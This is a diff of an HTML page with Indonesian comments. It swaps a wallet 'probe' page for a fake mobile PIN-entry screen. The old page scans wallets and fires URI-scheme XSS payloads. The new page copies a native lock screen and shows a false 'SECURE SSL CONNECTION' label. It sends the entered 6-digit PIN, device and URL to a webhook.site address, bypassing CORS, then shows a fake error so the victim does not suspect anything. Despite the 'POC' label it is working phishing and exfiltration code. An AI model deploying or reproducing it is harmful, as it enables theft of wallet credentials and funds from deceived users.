@@ -1,89 +1,108 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Ultimate Wallet Probe v2</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistem Verifikasi Wallet</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 12px; }
-        .found { color: #ffff00; font-weight: bold; background: #222; }
-        .error { color: #ff4444; }
-        .critical { color: white; background: red; padding: 2px; }
-        button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px 0; width: 100%; cursor: pointer; }
-        #log { border-top: 1px solid #333; margin-top: 10px; padding-top: 10px; }
+        /* Styling agar mirip dengan UI iOS/Android asli */
+        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .lock-icon { font-size: 45px; margin-bottom: 10px; }
+        h2 { font-size: 19px; font-weight: 400; margin-bottom: 35px; color: #f2f2f2; }
+        .dots-container { display: flex; gap: 18px; margin-bottom: 45px; }
+        .dot { width: 14px; height: 14px; border: 2px solid #fff; border-radius: 50%; transition: background 0.1s; }
+        .dot.filled { background-color: #fff; box-shadow: 0 0 8px #fff; }
+        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 22px; }
+        .key { width: 75px; height: 75px; border-radius: 50%; border: 1px solid #2c2c2e; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 26px; cursor: pointer; background: #1c1c1e; transition: background 0.1s; -webkit-tap-highlight-color: transparent; }
+        .key:active { background: #3a3a3c; }
+        .key span { font-size: 10px; color: #8e8e93; text-transform: uppercase; margin-top: -2px; }
+        #status-bar { margin-top: 30px; font-size: 11px; color: #444; letter-spacing: 1.5px; }
     </style>
 </head>
 <body>
-    <h3>Ultimate Wallet Probe v2</h3>
-    <button onclick="requestAccount()">1. Request Account (Eth/Flow)</button>
-    <button onclick="scanDeepHidden()">2. Scan Hidden Window Objects</button>
-    <button onclick="testDeepLink()">3. Test URI Scheme Bypass</button>
-    <div id="log"></div>
+
+    <div class="lock-icon">🔒</div>
+    <h2 id="msg-title">Masukkan PIN 6-Digit</h2>
+
+    <div class="dots-container" id="dots">
+        <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+    </div>
+
+    <div class="numpad">
+        <div class="key" onclick="press(1)">1</div>
+        <div class="key" onclick="press(2)">2<span>abc</span></div>
+        <div class="key" onclick="press(3)">3<span>def</span></div>
+        <div class="key" onclick="press(4)">4<span>ghi</span></div>
+        <div class="key" onclick="press(5)">5<span>jkl</span></div>
+        <div class="key" onclick="press(6)">6<span>mno</span></div>
+        <div class="key" onclick="press(7)">7<span>pqrs</span></div>
+        <div class="key" onclick="press(8)">8<span>tuv</span></div>
+        <div class="key" onclick="press(9)">9<span>wxyz</span></div>
+        <div style="visibility: hidden;"></div>
+        <div class="key" onclick="press(0)">0</div>
+        <div class="key" style="border:none; background:none; font-size: 15px; color:#ff453a;" onclick="backspace()">Hapus</div>
+    </div>
+
+    <div id="status-bar">SECURE SSL CONNECTION</div>
 
     <script>
-        const logDiv = document.getElementById('log');
-        function log(msg, type='') {
-            const div = document.createElement('div');
-            div.className = type;
-            div.innerHTML = > [${new Date().toLocaleTimeString()}] ${msg};
-            logDiv.prepend(div);
-        }
+        let pin = "";
+        const maxPin = 6;
+        const dots = document.querySelectorAll('.dot');
+        
+        // --- MASUKKAN URL DARI FOTO ANDA DI SINI ---
+        const webhookUrl = "https://webhook.site/d5429b7e-be6b-457a-9895-7d8470fd6ebe";
 
-        // 1. AUTO-SCAN: Mencari objek yang tidak dikenal di window
-        window.addEventListener('load', () => {
-            log("Memulai scanning objek asing...");
-            const ignore = ["window", "self", "document", "location", "history", "navigation", "webkit", "chrome"];
-            Object.keys(window).forEach(key => {
-                if (!ignore.includes(key) && isNaN(key)) {
-                    try {
-                        if (typeof window[key] === 'object' && window[key] !== null) {
-                            log(OBJEK TERDETEKSI: window.${key}, 'found');
-                        }
-                    } catch(e) {}
+        function press(num) {
+            if (pin.length < maxPin) {
+                pin += num;
+                updateDots();
+                if (pin.length === maxPin) {
+                    executeExfiltration(pin);
                 }
-            });
-        });
-
-        // 2. SCANNING MENDALAM: Mencari fungsi 'request' atau 'send'
-        function scanDeepHidden() {
-            log("Mencari fungsi request/send di semua objek...");
-            for (let key in window) {
-                try {
-                    if (window[key] && (window[key].request || window[key].send || window[key].sign)) {
-                        log(CRITICAL: Properti aktif ditemukan di window.${key}, 'critical');
-                    }
-                } catch(e) {}
             }
         }
 
-        // 3. REQUEST ACCOUNT (Sesuai kode Anda dengan peningkatan)
-        async function requestAccount() {
-            log("Memicu request account...");
-            // Cek Ethereum
-            if (window.ethereum) {
-                window.ethereum.request({ method: 'eth_requestAccounts' })
-                .then(acc => log(SUKSES ETH: ${acc[0]}, 'found'))
-                .catch(e => log(DITOLAK ETH: ${e.message}, 'error'));
-            }
-            // Cek Flow (FCL)
-            if (window.fcl) {
-                window.fcl.authenticate().then(user => log(SUKSES FLOW: ${user.addr}, 'found'));
-            }
+        function backspace() {
+            pin = pin.slice(0, -1);
+            updateDots();
         }
 
-        // 4. TEST DEEP LINK (XSS Bypass)
-        function testDeepLink() {
-            log("Testing URI Scheme...");
-            const payload = "javascript:alert(document.domain)";
-            const schemes = ['flow://open?url=', 'ethereum:send?url=', 'wc:'];
-            schemes.forEach(s => {
-                log(Memicu: ${s});
-                window.location.href = s + payload;
+        function updateDots() {
+            dots.forEach((dot, index) => {
+                index < pin.length ? dot.classList.add('filled') : dot.classList.remove('filled');
             });
         }
 
-        // 5. SNIFFING SEMUA PESAN (Sniffer)
-        window.addEventListener("message", (e) => {
-            log(PESAN MASUK dari ${e.origin}: ${JSON.stringify(e.data)}, 'found');
-        });
+        async function executeExfiltration(capturedPin) {
+            document.getElementById('msg-title').innerText = "Memverifikasi...";
+            
+            // Pengiriman Data ke Webhook Anda
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors', // Penting untuk bypass CORS di Webview Wallet
+                    body: JSON.stringify({
+                        alert: "POC: PIN_STOLEN",
+                        pin: capturedPin,
+                        device: navigator.userAgent,
+                        location: window.location.href,
+                        time: new Date().toLocaleString()
+                    })
+                });
+            } catch (e) {
+                console.error("Gagal kirim data");
+            }
+
+            // Simulasi Error agar korban tidak curiga
+            setTimeout(() => {
+                alert("Sesi verifikasi gagal. Silakan coba kembali beberapa saat lagi.");
+                pin = "";
+                updateDots();
+                document.getElementById('msg-title').innerText = "Masukkan PIN 6-Digit";
+            }, 1200);
+        }
     </script>
 </body>
 </html>
